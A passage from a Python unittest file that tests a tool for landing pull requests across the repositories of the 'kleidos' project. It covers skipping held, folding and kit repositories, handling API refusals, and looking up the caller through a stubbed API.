            self.assertEqual(self.land(f"{SLUG}#7", one), 2)
            self.assertEqual((self.said, self.stub.did), ([f"unknown: {one}"], []))

    def test_the_kit_the_held_and_the_leaving_are_never_walked(self) -> None:
        shipped = ecosystem.load()
        leaving = ecosystem.Repository(
            "kleidos-dev/leaving", public=False, folds_into="kleidos-dev/brand"
        )
        declared = dataclasses.replace(shipped, repositories=(*shipped.repositories, leaving))
        only = [r.slug for r in declared.repositories if r.hold or r.folds_into] + [declared.kit]
        self.assertEqual(landing.land(declared, only, True, self.stub), 0)
        self.assertEqual(self.api.gets, ["user"])
        self.assertEqual(self.stub.did, [])
        said = "\n".join(self.said)
        self.assertIn(f"skipped: {declared.kit}: the kit's releases are made by hand", said)
        self.assertIn("skipped: jmrplens/kleidos: on hold", said)
        self.assertIn("skipped: kleidos-dev/leaving: it moves into kleidos-dev/brand", said)

    def test_one_on_hold_is_not_landed_by_name(self) -> None:
        self.assertEqual(self.land("jmrplens/kleidos#7"), 1)
        self.assertEqual(self.said, ["skipped: jmrplens/kleidos#7: on hold"])
        self.assertEqual(self.api.gets, ["user"])

    def test_every_repository_is_walked_when_none_is_named(self) -> None:
        walked: list[str] = []

        def pulls(slug: str) -> list[dict[str, Any]]:
            walked.append(slug)
            return []

        with mock.patch.object(self.stub, "pulls", pulls):
            self.assertEqual(landing.land(ecosystem.load(), [], True, self.stub), 0)
        declared = ecosystem.load()
        self.assertEqual(
            walked, [r.slug for r in declared.repositories if not r.hold and r.slug != declared.kit]
        )

    def test_a_refusal_stops_that_repository(self) -> None:
        self.api.refuse = "/pulls?"
        self.assertEqual(self.land(), 1)
        self.assertEqual(self.said, [f"stopped: {SLUG}: refused"])
        self.said.clear()
        self.api.refuse = "/pulls/7"
        self.assertEqual(self.land(f"{SLUG}#7", merge=False), 1)
        self.assertEqual(self.said, [f"stopped: {SLUG}#7: refused"])
        for error in fast_forward.REFUSED:
            with mock.patch.object(self.stub, "pulls", side_effect=error("no")):
                self.assertEqual(self.land(), 1)

    def test_the_caller_is_asked_for_once_when_none_is_given(self) -> None:
        with (
            mock.patch.object(fast_forward.Api, "get", return_value={"login": "x"}) as get,
            mock.patch.object(landing.Lander, "pulls", return_value=[]),
        ):
            self.assertEqual(landing.land(ecosystem.load(), [SLUG], False), 0)
        self.assertEqual(get.call_args.args[-1], "user")


if __name__ == "__main__":
    unittest.main()
